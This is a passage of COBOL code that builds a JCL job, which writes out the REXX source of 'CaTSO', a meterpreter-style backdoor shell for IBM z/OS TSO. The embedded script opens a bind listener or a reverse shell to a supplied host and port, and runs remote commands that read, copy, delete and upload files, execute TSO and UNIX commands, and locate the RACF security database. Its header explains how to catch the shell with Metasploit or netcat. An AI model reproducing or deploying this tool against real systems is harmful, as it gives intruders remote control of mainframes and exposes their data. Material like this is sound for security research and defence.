     MOVE '//CATSOJO  J
-    OB ''CATSO'''
-    TO WS-LINE(1)
     MOVE '//DEL0010  EX
-    EC PGM=IEFBR14'
-    TO WS-LINE(2)
     MOVE '//DSN2DEL  DD   DSN=DOGE
-    .CATSO,DISP=(MOD,DELETE),'
-    TO WS-LINE(3)
     MOVE '//         S
-    PACE=(CYL,0)'
-    TO WS-LINE(4)
     MOVE '//         EXE
-    C PGM=IEBGENER'
-    TO WS-LINE(5)
     MOVE '//SYSIN  
-      DD DUMMY'
-    TO WS-LINE(6)
     MOVE '//SYSPRINT 
-    DD SYSOUT=X'
-    TO WS-LINE(7)
     MOVE '//SYSUT1   
-    DD *,DLM=XX'
-    TO WS-LINE(8)
     MOVE '/*                           REXX  
-                                      */'
-    TO WS-LINE(9)
     MOVE '/*  Catso. n. 1. A base fellow; a r
-    ogue; a cheat,                    */'
-    TO WS-LINE(10)
     MOVE '/*               also a z/OS Network
-     TSO ''shell''                     */'
-    TO WS-LINE(11)
     MOVE '/*                                 
-                                      */'
-    TO WS-LINE(12)
     MOVE '/*  CaTSO is a A "meterpreter" like
-     shell written in REXX.           */'
-    TO WS-LINE(13)
     MOVE '/*  Yet another amazing mainframe t
-    ool brought to you by:            */'
-    TO WS-LINE(14)
     MOVE '/*             .                  .
-             .                        */'
-    TO WS-LINE(15)
     MOVE '/*             .___________       .
-    _________.                        */'
-    TO WS-LINE(16)
     MOVE '/*             :    .     /       :
-             :                        */'
-    TO WS-LINE(17)
     MOVE '/*             |    |____/________|
-        _____|                        */'
-    TO WS-LINE(18)
     MOVE '/*             |____.    |        |
-             |                        */'
-    TO WS-LINE(19)
     MOVE '/*             |    |    |    :   |
-       ______:                        */'
-    TO WS-LINE(20)
     MOVE '/*             |    |    |    |   |
-       |     .                        */'
-    TO WS-LINE(21)
     MOVE '/*             :_________|________|
-    ___|                              */'
-    TO WS-LINE(22)
     MOVE '/*             . Soldier     of    
-     Fortran                          */'
-    TO WS-LINE(23)
     MOVE '/*                   (@mainframed76
-    7)                                */'
-    TO WS-LINE(24)
     MOVE '/*                                 
-                                      */'
-    TO WS-LINE(25)
     MOVE '/*  This is a REXX script meant to 
-    run in TSO on IBM z/OS            */'
-    TO WS-LINE(26)
     MOVE '/*  It creates a Listener or Reverse
-     ''shell'' on a supplied port      */'
-    TO WS-LINE(27)
     MOVE '/*  Connect to it with either metas
-    ploit or netcat                   */'
-    TO WS-LINE(28)
     MOVE '/*                                 
-                                      */'
-    TO WS-LINE(29)
     MOVE '/*  Either upload the script and exe
-    cute: tso ex ''userid.zossock''    */'
-    TO WS-LINE(30)
     MOVE '/*  or use a JCL file and execute i
-    t that way                        */'
-    TO WS-LINE(31)
     MOVE '/*  On the PC side you can use Netc
-    at or Metasploit to connect.      */'
-    TO WS-LINE(32)
     MOVE '/*                                 
-                                      */'
-    TO WS-LINE(33)
     MOVE '/*  In Listener Mode               
-                                      */'
-    TO WS-LINE(34)
     MOVE '/*  ================               
-                                      */'
-    TO WS-LINE(35)
     MOVE '/*  On the Mainframe:              
-                                      */'
-    TO WS-LINE(36)
     MOVE '/*  <scriptname> L Port            
-                                      */'
-    TO WS-LINE(37)
     MOVE '/*                                 
-                                      */'
-    TO WS-LINE(38)
     MOVE '/*  With Metasploit:               
-                                      */'
-    TO WS-LINE(39)
     MOVE '/*  msf > use multi/handler        
-                                      */'
-    TO WS-LINE(40)
     MOVE '/*  msf exploit(handler) > set payl
-    oad generic/shell_bind_tcp        */'
-    TO WS-LINE(41)
     MOVE '/*  payload => generic/shell_bind_t
-    cp                                */'
-    TO WS-LINE(42)
     MOVE '/*  msf exploit(handler) > set RHOS
-    T IP  (Mainframe IP Address)      */'
-    TO WS-LINE(43)
     MOVE '/*  msf exploit(handler) > set LPOR
-    T Port (the port you picked)      */'
-    TO WS-LINE(44)
     MOVE '/*  msf exploit(handler) > exploit 
-                                      */'
-    TO WS-LINE(45)
     MOVE '/*                                 
-                                      */'
-    TO WS-LINE(46)
     MOVE '/*  With Netcat:                   
-                                      */'
-    TO WS-LINE(47)
     MOVE '/*  $ nc IP Port                   
-                                      */'
-    TO WS-LINE(48)
     MOVE '/*                                 
-                                      */'
-    TO WS-LINE(49)
     MOVE '/*  In Reverse Mode                
-                                      */'
-    TO WS-LINE(50)
     MOVE '/*  ================               
-                                      */'
-    TO WS-LINE(51)
     MOVE '/*  With Metasploit:               
-                                      */'
-    TO WS-LINE(52)
     MOVE '/*  msf > use multi/handler        
-                                      */'
-    TO WS-LINE(53)
     MOVE '/*  msf exploit(handler) > set payl
-    oad generic/shell_reverse_tcp     */'
-    TO WS-LINE(54)
     MOVE '/*  payload => generic/shell_revers
-    e_tcp                             */'
-    TO WS-LINE(55)
     MOVE '/*  msf exploit(handler) > set lhos
-    t your-ip-address                 */'
-    TO WS-LINE(56)
     MOVE '/*  msf exploit(handler) > set LPOR
-    T your-port                       */'
-    TO WS-LINE(57)
     MOVE '/*  msf exploit(handler) > exploit 
-                                      */'
-    TO WS-LINE(58)
     MOVE '/*                                 
-                                      */'
-    TO WS-LINE(59)
     MOVE '/*  With Netcat:                   
-                                      */'
-    TO WS-LINE(60)
     MOVE '/*  $ nc -lp your_port             
-                                      */'
-    TO WS-LINE(61)
     MOVE '/*                                 
-                                      */'
-    TO WS-LINE(62)
     MOVE '/*  On the Mainframe:              
-                                      */'
-    TO WS-LINE(63)
     MOVE '/*  <scriptname> R your-ip-addredd 
-    your-port                         */'
-    TO WS-LINE(64)
     MOVE '/*                                 
-                                      */'
-    TO WS-LINE(65)
     MOVE '/*  ASCII Art modified from:       
-                                      */'
-    TO WS-LINE(66)
     MOVE '/*   http://sixteencolors.net/pack/
-    rmrs-03/DW-CHOOS.ANS              */'
-    TO WS-LINE(67)
     MOVE '/*                                 
-                                      */'
-    TO WS-LINE(68)
     MOVE '/*                   Let''s start th
-    e show!                           */'
-    TO WS-LINE(69)
     MOVE '/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */'
-    TO WS-LINE(70)
     MOVE '
-    '
-    TO WS-LINE(71)
     MOVE '/* Uncomment this line 
-    to turn on debugging */'
-    TO WS-LINE(72)
     MOVE '/* TRA
-    CE I */'
-    TO WS-LINE(73)
     MOVE '/* change verbose to 1 to s
-    ee results on the screen */'
-    TO WS-LINE(74)
     MOVE 'verbo
-    se = 0'
-    TO WS-LINE(75)
     MOVE '
-    '
-    TO WS-LINE(76)
     MOVE 'if verbose t
-    hen say '''''
-    TO WS-LINE(77)
     MOVE 'if verbose t
-    hen say '''''
-    TO WS-LINE(78)
     MOVE 'if verbose t
-    hen say '''''
-    TO WS-LINE(79)
     MOVE 'pwd = u
-    serid()'
-    TO WS-LINE(80)
     MOVE 'NEWLINE = "25"x /* this is the
-     hex equivalent of EBCDIC /n */'
-    TO WS-LINE(81)
     MOVE '
-    '
-    TO WS-LINE(82)
     MOVE 'PARSE ARG type 
-    arghost argport'
-    TO WS-LINE(83)
     MOVE '
-    '
-    TO WS-LINE(84)
     MOVE '/* Parse the arguments to
-     see what we want to do */'
-    TO WS-LINE(85)
     MOVE 'SEL
-    ECT'
-    TO WS-LINE(86)
     MOVE 'WHEN type =
-     ''L'' THEN'
-    TO WS-LINE(87)
     MOVE 'D
-    O'
-    TO WS-LINE(88)
     MOVE '   IF arghos
-    t = '''' THEN'
-    TO WS-LINE(89)
     MOVE '  
-     DO'
-    TO WS-LINE(90)
     MOVE '     if verbose then say "[+] You 
-    specified Listener without a port."'
-    TO WS-LINE(91)
     MOVE '     if verbose then sa
-    y "Using default: 12345"'
-    TO WS-LINE(92)
     MOVE '     argho
-    st = 12345'
-    TO WS-LINE(93)
     MOVE '   
-    END'
-    TO WS-LINE(94)
     MOVE 'if verbose then say ''[+] L
-    istening on port:'' arghost'
-    TO WS-LINE(95)
     MOVE 'party = MATT_D
-    AEMON(arghost)'
-    TO WS-LINE(96)
     MOVE 'E
-    ND'
-    TO WS-LINE(97)
     MOVE 'WHEN type =
-     ''R'' THEN'
-    TO WS-LINE(98)
     MOVE 'D
-    O'
-    TO WS-LINE(99)
     MOVE '  IF arghost = '''' 
-    | argport = '''' THEN'
-    TO WS-LINE(100)
     MOVE '  
-    DO'
-    TO WS-LINE(101)
     MOVE '   SAY ''[!] You must pass a ho
-    st and port when using Reverse'''
-    TO WS-LINE(102)
     MOVE '   E
-    XIT 4'
-    TO WS-LINE(103)
     MOVE '  
-    END'
-    TO WS-LINE(104)
     MOVE '  if verbose then say ''[+] Sendin
-    g shell to'' arghost||":"||argport'
-    TO WS-LINE(105)
     MOVE ' ttime = RIVER_SONG(arghost,ar
-    gport) /* Reverse Connection */'
-    TO WS-LINE(106)
     MOVE 'E
-    ND'
-    TO WS-LINE(107)
     MOVE 'OTHERWISE  /*
-     Excellent */'
-    TO WS-LINE(108)
     MOVE '        PARSE SOU
-    RCE . . . . name .'
-    TO WS-LINE(109)
     MOVE '        say "No arguments passed! R
-    un this as either server or client:"'
-    TO WS-LINE(110)
     MOVE '        say "Reverse Shell: 
-    ''"||name||"'' ''R IP PORT''"'
-    TO WS-LINE(111)
     MOVE '        say "Listener Shell
-    : ''"||name||"'' ''L PORT''"'
-    TO WS-LINE(112)
     MOVE '    E
-    XIT 4'
-    TO WS-LINE(113)
     MOVE 'END /* End the ar
-    guments parser */'
-    TO WS-LINE(114)
     MOVE '
-    '
-    TO WS-LINE(115)
     MOVE 'MATT_DAEMON: /* Start
-    s the listener mode */'
-    TO WS-LINE(116)
     MOVE '    parse
-     arg port'
-    TO WS-LINE(117)
     MOVE '    terp = SOCKET(''INI
-    TIALIZE'',''DAEMON'',2)'
-    TO WS-LINE(118)
     MOVE '    /* terp is shor
-    t for z-terpreter */'
-    TO WS-LINE(119)
     MOVE '    parse var 
-    terp terp_rc .'
-    TO WS-LINE(120)
     MOVE '    IF terp_
-    rc <> 0 THEN'
-    TO WS-LINE(121)
     MOVE '   
-     DO'
-    TO WS-LINE(122)
     MOVE '      if verbose then say "
-    [!] Couldn''t create socket"'
-    TO WS-LINE(123)
     MOVE '      
-    exit 1'
-    TO WS-LINE(124)
     MOVE '   
-     END'
-    TO WS-LINE(125)
     MOVE '    terp = Socke
-    t(''GetHostId'')'
-    TO WS-LINE(126)
     MOVE '    parse var terp
-     socket_rc MF_IP .'
-    TO WS-LINE(127)
     MOVE '    terp = Socket
-    (''Gethostname'')'
-    TO WS-LINE(128)
     MOVE '    parse var t
-    erp src hostname'
-    TO WS-LINE(129)
     MOVE '    /* setup 
-    the socket */'
-    TO WS-LINE(130)
     MOVE '    terp = SOC
-    KET(''SOCKET'')'
-    TO WS-LINE(131)
     MOVE '    parse var terp 
-    socket_rc socketID .'
-    TO WS-LINE(132)
     MOVE '    if socket
-    _rc <> 0 then'
-    TO WS-LINE(133)
     MOVE '   
-     DO'
-    TO WS-LINE(134)
     MOVE '      if verbose then say "[!]
-     Socket FAILED with info:" terp'
-    TO WS-LINE(135)
     MOVE '      terp = SOCK
-    ET(''TERMINATE'')'
-    TO WS-LINE(136)
     MOVE '      
-    exit 1'
-    TO WS-LINE(137)
     MOVE '   
-     END'
-    TO WS-LINE(138)
     MOVE '
-    '
-    TO WS-LINE(139)
     MOVE '    /* Setup: ASCII conversion, Re
-    use, no linger and non-blocking */'
-    TO WS-LINE(140)
     MOVE '  terp = Socket(''SETSOCKOPT'',socketID
-    ,''SOL_SOCKET'',''SO_REUSEADDR'',''ON'')'
-    TO WS-LINE(141)
     MOVE '    terp = Socket(''SETSOCKOPT'',socket
-    ID,''SOL_SOCKET'',''SO_LINGER'',''OFF'')'
-    TO WS-LINE(142)
     MOVE '  terp = Socket(''SETSOCKOPT'',socketID
-    ,''SOL_SOCKET'',''SO_KEEPALIVE'',''ON'')'
-    TO WS-LINE(143)
     MOVE '    terp = Socket(''IOCTL'',
-    socketID,''FIONBIO'',''ON'')'
-    TO WS-LINE(144)
     MOVE '    terp = Socket(''BIND'',so
-    cketID,''AF_INET'' port MF_IP)'
-    TO WS-LINE(145)
     MOVE '    parse var ter
-    p connect_rc rest'
-    TO WS-LINE(146)
     MOVE '    if connec
-    t_rc <> 0 then'
-    TO WS-LINE(147)
     MOVE '   
-     DO'
-    TO WS-LINE(148)
     MOVE '      if verbose then sa
-    y "[!] Bind Failed:" terp'
-    TO WS-LINE(149)
     MOVE '      CALL DA
-    VID_COULIER(1)'
-    TO WS-LINE(150)
     MOVE '   
-     END'
-    TO WS-LINE(151)
     MOVE '    if verbose then say "[!] IP
-    " MF_IP "and Port" port "opened"'
-    TO WS-LINE(152)
     MOVE '    terp = Socket(''
-    Listen'',socketID,2)'
-    TO WS-LINE(153)
     MOVE '    parse va
-    r terp src .'
-    TO WS-LINE(154)
     MOVE '    if src > 0 the
-    n DAVID_COULIER(1)'
-    TO WS-LINE(155)
     MOVE '    if verbose then sa
-    y ''[+] Server Ready'''
-    TO WS-LINE(156)
     MOVE '
-    '
-    TO WS-LINE(157)
     MOVE '    clien
-    ts = '''''
-    TO WS-LINE(158)
     MOVE '   DO FOREVER /* Like, fo
-    rever forever? A: Yes. */'
-    TO WS-LINE(159)
     MOVE '    terp = Socket(''Select'',''READ'' s
-    ocketID clients ''WRITE'' ''EXCEPTION'')'
-    TO WS-LINE(160)
     MOVE 'parse upper var terp ''READ'' readin '
-    'WRITE'' writtin ''EXCEPTION'' exceptin'
-    TO WS-LINE(161)
     MOVE '
-    '
-    TO WS-LINE(162)
     MOVE '    IF INLIST(socketID,readin) THE
-    N /* see if we have a new socket */'
-    TO WS-LINE(163)
     MOVE '   
-     DO'
-    TO WS-LINE(164)
     MOVE '     terp = Socket(
-    ''Accept'',socketID)'
-    TO WS-LINE(165)
     MOVE '     parse var terp sr
-    c hackerID . hport hip'
-    TO WS-LINE(166)
     MOVE '     if verbose then say "[!] Co
-    nnection from "||hip||":"||hport'
-    TO WS-LINE(167)
     MOVE '     client
-    s = hackerID'
-    TO WS-LINE(168)
     MOVE '     if verbose then say ''[
-    +] Hacker socket ID'' clients'
-    TO WS-LINE(169)
     MOVE '     terp = Socket(
-    ''Socketsetstatus'')'
-    TO WS-LINE(170)
     MOVE '     parse var t
-    erp src . status'
-    TO WS-LINE(171)
     MOVE '     if verbose then say ''
-    [+] Current Status'' status'
-    TO WS-LINE(172)
     MOVE '     terp = Socket(''Setsockopt'',hacke
-    rID,''SOL_SOCKET'',''SO_ASCII'',''ON'')'
-    TO WS-LINE(173)
     MOVE '     terp = Socket(''Ioctl'',
-    hackerID,''FIONBIO'',''ON'' )'
-    TO WS-LINE(174)
     MOVE '     terp = SOCKET(''SEND'',hacker
-    ID, "Enter command or ''help''> ")'
-    TO WS-LINE(175)
     MOVE '    END /* end new 
-    connection check */'
-    TO WS-LINE(176)
     MOVE '/* If the READ is our hacker sock
-    et ID then do all the goodness */'
-    TO WS-LINE(177)
     MOVE '/* since there''s only one socket 
-    allowed, it will only be that id */'
-    TO WS-LINE(178)
     MOVE '    if readin 
-    = hackerID THEN'
-    TO WS-LINE(179)
     MOVE '   
-     DO'
-    TO WS-LINE(180)
     MOVE '     ARNOLD = commando(hack
-    erID) /* get the command */'
-    TO WS-LINE(181)
     MOVE '     if verbose then say "[+]
-     Commands received: "||ARNOLD'
-    TO WS-LINE(182)
     MOVE '     parse = CHOPPA(hackerID,ARNOL
-    D) /* Get the cmd to da choppa! */'
-    TO WS-LINE(183)
     MOVE '   
-     END'
-    TO WS-LINE(184)
     MOVE '   END /* OK 
-    not forever */'
-    TO WS-LINE(185)
     MOVE '
-    '
-    TO WS-LINE(186)
     MOVE 'retu
-    rn 0'
-    TO WS-LINE(187)
     MOVE '
-    '
-    TO WS-LINE(188)
     MOVE 'RIVER_SONG: /* Get it? Reverse Co
-    n, connection? Yea you got it! */'
-    TO WS-LINE(189)
     MOVE 'PARSE ARG r
-    host,  rport'
-    TO WS-LINE(190)
     MOVE '    terp = SOCKET(''INI
-    TIALIZE'',''CLIENT'',2)'
-    TO WS-LINE(191)
     MOVE '    /* terp is shor
-    t for z-terpreter */'
-    TO WS-LINE(192)
     MOVE '    terp = SOCKET(''SOCKE
-    T'',2,''STREAM'',''TCP'')'
-    TO WS-LINE(193)
     MOVE '    parse var terp 
-    socket_rc socketID .'
-    TO WS-LINE(194)
     MOVE '    if socket
-    _rc <> 0 then'
-    TO WS-LINE(195)
     MOVE '   
-     do'
-    TO WS-LINE(196)
     MOVE '       if verbose then say "[!]
-     Socket FAILED with info:" terp'
-    TO WS-LINE(197)
     MOVE '       terp = SOC
-    KET(''TERMINATE'')'
-    TO WS-LINE(198)
     MOVE '      
-     exit 1'
-    TO WS-LINE(199)
     MOVE '   
-     end'
-    TO WS-LINE(200)
     MOVE '  terp = Socket(''SETSOCKOPT'',socketID
-    ,''SOL_SOCKET'',''SO_KEEPALIVE'',''ON'')'
-    TO WS-LINE(201)
     MOVE '    /* Okay now we setup so it ca
-    n do EBCDIC to ASCII conversion */'
-    TO WS-LINE(202)
     MOVE '    terp = SOCKET(''SETSOCKOPT'',socke
-    tID,''SOL_SOCKET'',''SO_ASCII'',''On'')'
-    TO WS-LINE(203)
     MOVE '    parse var 
-    terp ascii_rc .'
-    TO WS-LINE(204)
     MOVE '    if ascii
-    _rc <> 0 then'
-    TO WS-LINE(205)
     MOVE '   
-     do'
-    TO WS-LINE(206)
     MOVE '      if verbose then say "[!] 
-    Setting ASCII mode failed:" terp'
-    TO WS-LINE(207)
     MOVE '      
-    exit 1'
-    TO WS-LINE(208)
     MOVE '   
-     end'
-    TO WS-LINE(209)
     MOVE '    terp = SOCKET(''SOCK
-    ETSETSTATUS'',''CLIENT'')'
-    TO WS-LINE(210)
     MOVE '    if verbose then say "
-    [+] Socket Status is" terp'
-    TO WS-LINE(211)
     MOVE '    terp = SOCKET(''CONNECT'',s
-    ocketID,''AF_INET'' rport rhost)'
-    TO WS-LINE(212)
     MOVE '    parse var ter
-    p connect_rc rest'
-    TO WS-LINE(213)
     MOVE '    if connec
-    t_rc <> 0 then'
-    TO WS-LINE(214)
     MOVE '   
-     do'
-    TO WS-LINE(215)
     MOVE '      if verbose then say "
-    [!] Connection Failed:" terp'
-    TO WS-LINE(216)
     MOVE '      CALL DA
-    VID_COULIER(4)'
-    TO WS-LINE(217)
     MOVE '   
-     end'
-    TO WS-LINE(218)
     MOVE '    if verbose then say "[!]
-     Connection Established to",'
-    TO WS-LINE(219)
     MOVE '                    
-        rhost||":"||rport'
-    TO WS-LINE(220)
     MOVE '    terp = SOCKET(''SEND'',socket
-    ID, "Enter command or ''help''> ")'
-    TO WS-LINE(221)
     MOVE '
-    '
-    TO WS-LINE(222)
     MOVE '    DO FOREVER /* The 
-    never end storyyyyy */'
-    TO WS-LINE(223)
     MOVE '      ARNOLD = commando(soc
-    ketID) /* get the command */'
-    TO WS-LINE(224)
     MOVE '      if verbose then say "[+
-    ] Commands received: "||ARNOLD'
-    TO WS-LINE(225)
     MOVE '      parse = CHOPPA(socketID,ARNO
-    LD) /* get the cmd to da choppa! */'
-    TO WS-LINE(226)
     MOVE '    END /*
-     Atreyu! */'
-    TO WS-LINE(227)
     MOVE 'retu
-    rn 0'
-    TO WS-LINE(228)
     MOVE '
-    '
-    TO WS-LINE(229)
     MOVE 'DAVID_COULIER: /*
-     CUT. IT. OUT. */'
-    TO WS-LINE(230)
     MOVE '    parse 
-    arg exito .'
-    TO WS-LINE(231)
     MOVE '    terp = SOCKET(
-    ''CLOSE'',socketID)'
-    TO WS-LINE(232)
     MOVE '    EXI
-    T exito'
-    TO WS-LINE(233)
     MOVE 'retu
-    rn 0'
-    TO WS-LINE(234)
     MOVE '
-    '
-    TO WS-LINE(235)
     MOVE 'CHO
-    PPA:'
-    TO WS-LINE(236)
     MOVE 'parse arg s
-    ockID, do_it'
-    TO WS-LINE(237)
     MOVE 'parse var do_it 
-    do_it do_commands'
-    TO WS-LINE(238)
     MOVE '/* We have our socket and c
-    ommands not lets do this */'
-    TO WS-LINE(239)
     MOVE '    S
-    ELECT'
-    TO WS-LINE(240)
     MOVE '        WHEN do_it
-     = ''sysinfo'' THEN'
-    TO WS-LINE(241)
     MOVE '     
-       DO'
-    TO WS-LINE(242)
     MOVE '          send_i
-    t = GET_OS_INFO()'
-    TO WS-LINE(243)
     MOVE '          if verbose then 
-    say ''[!] Sending OS Info'''
-    TO WS-LINE(244)
     MOVE '          terp = SOCKET(''SEN
-    D'',sockID, send_it||NEWLINE)'
-    TO WS-LINE(245)
     MOVE '     
-       END'
-    TO WS-LINE(246)
     MOVE '        WHEN do_
-    it = ''cat'' THEN'
-    TO WS-LINE(247)
     MOVE '     
-       DO'
-    TO WS-LINE(248)
     MOVE '          send_it = 
-    CAT_FILE(do_commands)'
-    TO WS-LINE(249)
     MOVE '          if verbose then say '
-    '[!] Catting file'' do_commands'
-    TO WS-LINE(250)
     MOVE '          terp = SOCKET(''SEN
-    D'',sockID, send_it||NEWLINE)'
-    TO WS-LINE(251)
     MOVE '     
-       END'
-    TO WS-LINE(252)
     MOVE '        WHEN do_
-    it = ''cd'' THEN'
-    TO WS-LINE(253)
     MOVE '     
-       DO'
-    TO WS-LINE(254)
     MOVE '            if verbose then 
-    say ''[!] CD to'' do_commands'
-    TO WS-LINE(255)
     MOVE '            send_it = NEWLINE|
-    |"cd to "||do_commands||NEWLINE'
-    TO WS-LINE(256)
     MOVE '            pw
-    d = do_commands'
-    TO WS-LINE(257)
     MOVE '            terp = SOCKET(''SE
-    ND'',sockID, send_it||NEWLINE)'
-    TO WS-LINE(258)
     MOVE '     
-       END'
-    TO WS-LINE(259)
     MOVE '        WHEN do_
-    it = ''pwd'' THEN'
-    TO WS-LINE(260)
     MOVE '     
-       DO'
-    TO WS-LINE(261)
     MOVE '          send_it = NEWL
-    INE||UPPER(pwd)||NEWLINE'
-    TO WS-LINE(262)
     MOVE '          if verbose then sa
-    y ''[!] Sending PWD of:'' pwd'
-    TO WS-LINE(263)
     MOVE '          terp = SOCKET(''SEN
-    D'',sockID, send_it||NEWLINE)'
-    TO WS-LINE(264)
     MOVE '     
-       END'
-    TO WS-LINE(265)
     MOVE '        WHEN do_
-    it = ''ls'' THEN'
-    TO WS-LINE(266)
     MOVE '     
-       DO'
-    TO WS-LINE(267)
     MOVE '          IF do_co
-    mmands = '''' THEN'
-    TO WS-LINE(268)
     MOVE '            send_i
-    t = LS(sockID,pwd)'
-    TO WS-LINE(269)
     MOVE '       
-       ELSE'
-    TO WS-LINE(270)
     MOVE '            send_it = 
-    LS(sockID,do_commands)'
-    TO WS-LINE(271)
     MOVE '          if verbose then sa
-    y ''[!] Sending LS COMMAND'''
-    TO WS-LINE(272)
     MOVE '          terp = SOCKET(''SEN
-    D'',sockID, send_it||NEWLINE)'
-    TO WS-LINE(273)
     MOVE '     
-       END'
-    TO WS-LINE(274)
     MOVE '        WHEN do_
-    it = ''cp'' THEN'
-    TO WS-LINE(275)
     MOVE '     
-       DO'
-    TO WS-LINE(276)
     MOVE '          send_it
-     = CP(do_commands)'
-    TO WS-LINE(277)
     MOVE '          if verbose then sa
-    y ''[!] Copying'' do_commands'
-    TO WS-LINE(278)
     MOVE '          terp = SOCKET(''SEN
-    D'',sockID, send_it||NEWLINE)'
-    TO WS-LINE(279)
     MOVE '     
-       END'
-    TO WS-LINE(280)
     MOVE '        WHEN do_it = ''del'
-    ' | do_it = ''delete'' THEN'
-    TO WS-LINE(281)
     MOVE '     
-       DO'
-    TO WS-LINE(282)
     MOVE '          send_it =
-     DELETE(do_commands)'
-    TO WS-LINE(283)
     MOVE '          if verbose then say
-     ''[!] Deleting'' do_commands'
-    TO WS-LINE(284)
     MOVE '          terp = SOCKET(''SEN
-    D'',sockID, send_it||NEWLINE)'
-    TO WS-LINE(285)
     MOVE '     
-       END'
-    TO WS-LINE(286)
     MOVE '
-    '
-    TO WS-LINE(287)
     MOVE '        WHEN do_i
-    t = ''unix'' THEN'
-    TO WS-LINE(288)
     MOVE '     
-       DO'
-    TO WS-LINE(289)
     MOVE '          send_it = UN
-    IX_COMMAND(do_commands)'
-    TO WS-LINE(290)
     MOVE '          if verbose then say
-     ''[!] Sending UNIX COMMAND'''
-    TO WS-LINE(291)
     MOVE '          terp = SOCKET(''SEN
-    D'',sockID, send_it||NEWLINE)'
-    TO WS-LINE(292)
     MOVE '     
-       END'
-    TO WS-LINE(293)
     MOVE '        WHEN do_it = ''tso'
-    ' | do_it = ''execute'' THEN'
-    TO WS-LINE(294)
     MOVE '     
-       DO'
-    TO WS-LINE(295)
     MOVE '          send_it = TS
-    O_COMMAND(do_commands)'
-    TO WS-LINE(296)
     MOVE '          if verbose then say ''[!]
-     Executing TSO Command'' do_commands'
-    TO WS-LINE(297)
     MOVE '          terp = SOCKET(''SEN
-    D'',sockID, send_it||NEWLINE)'
-    TO WS-LINE(298)
     MOVE '     
-       END'
-    TO WS-LINE(299)
     MOVE '        WHEN do_
-    it = ''ftp'' THEN'
-    TO WS-LINE(300)
     MOVE '     
-       DO'
-    TO WS-LINE(301)
     MOVE '          send_it = UP
-    LOAD_FILE(do_commands)'
-    TO WS-LINE(302)
     MOVE '          if verbose then say ''[!] 
-    Using FTP to upload to'' do_commands'
-    TO WS-LINE(303)
     MOVE '          terp = SOCKET(''SEN
-    D'',sockID, send_it||NEWLINE)'
-    TO WS-LINE(304)
     MOVE '     
-       END'
-    TO WS-LINE(305)
     MOVE '        WHEN do_it
-     = ''getuid'' THEN'
-    TO WS-LINE(306)
     MOVE '     
-       DO'
-    TO WS-LINE(307)
     MOVE '          send
-    _it = GET_UID()'
-    TO WS-LINE(308)
     MOVE '          if verbose the
-    n say ''[!] Sending UID'''
-    TO WS-LINE(309)
     MOVE '          terp = SOCKET(''SEN
-    D'',sockID, send_it||NEWLINE)'
-    TO WS-LINE(310)
     MOVE '     
-       END'
-    TO WS-LINE(311)
     MOVE '        WHEN do_i
-    t = ''lsmem'' THEN'
-    TO WS-LINE(312)
     MOVE '     
-       DO'
-    TO WS-LINE(313)
     MOVE '          IF do_co
-    mmands = '''' THEN'
-    TO WS-LINE(314)
     MOVE '            send_i
-    t = LS_MEMBERS(pwd)'
-    TO WS-LINE(315)
     MOVE '       
-       ELSE'
-    TO WS-LINE(316)
     MOVE '            send_it = 
-    LS_MEMBERS(do_commands)'
-    TO WS-LINE(317)
     MOVE '          if verbose then 
-    say ''[!] Sending Members'''
-    TO WS-LINE(318)
     MOVE '          terp = SOCKET(''SEN
-    D'',sockID, send_it||NEWLINE)'
-    TO WS-LINE(319)
     MOVE '     
-       END'
-    TO WS-LINE(320)
     MOVE '        WHEN do_it = ''ipconfi
-    g'' | do_it = ''ifconfig'' THEN'
-    TO WS-LINE(321)
     MOVE '     
-       DO'
-    TO WS-LINE(322)
     MOVE '          send_i
-    t = GET_IP_INFO()'
-    TO WS-LINE(323)
     MOVE '          if verbose then 
-    say ''[!] Sending IP Info'''
-    TO WS-LINE(324)
     MOVE '          terp = SOCKET(''SEN
-    D'',sockID, send_it||NEWLINE)'
-    TO WS-LINE(325)
     MOVE '     
-       END'
-    TO WS-LINE(326)
     MOVE '        WHEN do_i
-    t = ''racf'' THEN'
-    TO WS-LINE(327)
     MOVE '     
-       DO'
-    TO WS-LINE(328)
     MOVE '          send_i
-    t = GET_RACFDB()'
-    TO WS-LINE(329)
     MOVE '          if verbose then say ''[!] 
-    Sending RACF Database Dataset Name'''
-    TO WS-LINE(330)
     MOVE '          terp = SOCKET(''SEN
-    D'',sockID, send_it||NEWLINE)'
-    TO WS-LINE(331)
     MOVE '     
-       END'
-    TO WS-LINE(332)
     MOVE '        WHEN do_i
-    t = ''help'' THEN'
-    TO WS-LINE(333)
     MOVE '     
-       DO'
-    TO WS-LINE(334)
     MOVE '          send_
-    it = GET_HELP()'
-    TO WS-LINE(335)
     MOVE '          if verbose then
-     say ''[!] Sending Help'''
-    TO WS-LINE(336)
     MOVE '          terp = SOCKET(''SEN
-    D'',sockID, send_it||NEWLINE)'
-    TO WS-LINE(337)
     MOVE '     
-       END'
-    TO WS-LINE(338)
     MOVE '        WHEN do_it = ''qui
-    t'' | do_it = ''exit'' THEN'
-    TO WS-LINE(339)
     MOVE '     
-       DO'
-    TO WS-LINE(340)
     MOVE '          if verbose th
-    en say ''[!] POP POP!'''
-    TO WS-LINE(341)
     MOVE '          CALL DAVID_CO
-    ULIER(0) /* jackalope */'
-    TO WS-LINE(342)
     MOVE '    
-     END'
-    TO WS-LINE(343)
     MOVE '     OTHERWISE /* The
-     end of our options */'
-    TO WS-LINE(344)
     MOVE '         if verbose then say
-     ''[!] Unrecognized Command'''
-    TO WS-LINE(345)
     MOVE '    END /* End the
-     select section */'
-    TO WS-LINE(346)
     MOVE '    terp = SOCKET(''SEND'',sockI
-    D, "Enter command or ''help''> ")'
-    TO WS-LINE(347)
     MOVE '  ret
-    urn 0'
-    TO WS-LINE(348)
     MOVE '
-    '
-    TO WS-LINE(349)
     MOVE 'INLIST: 
-    procedure'
-    TO WS-LINE(350)
     MOVE 'arg sock,
-     socklist'
-    TO WS-LINE(351)
     MOVE '
-    '
-    TO WS-LINE(352)
     MOVE 'DO i = 1 to w
-    ords(socklist)'
-    TO WS-LINE(353)
     MOVE '  if words(s
-    ocklist) = 0'
-    TO WS-LINE(354)
     MOVE '    then
-     return 0'
-    TO WS-LINE(355)
     MOVE '  if sock = wo
-    rd(socklist,i)'
-    TO WS-LINE(356)
     MOVE '    then
-     return 1'
-    TO WS-LINE(357)
     MOVE 'e
-    nd'
-    TO WS-LINE(358)
     MOVE '
-    '
-    TO WS-LINE(359)
     MOVE 'retu
-    rn 0'
-    TO WS-LINE(360)
     MOVE '
-    '
-    TO WS-LINE(361)
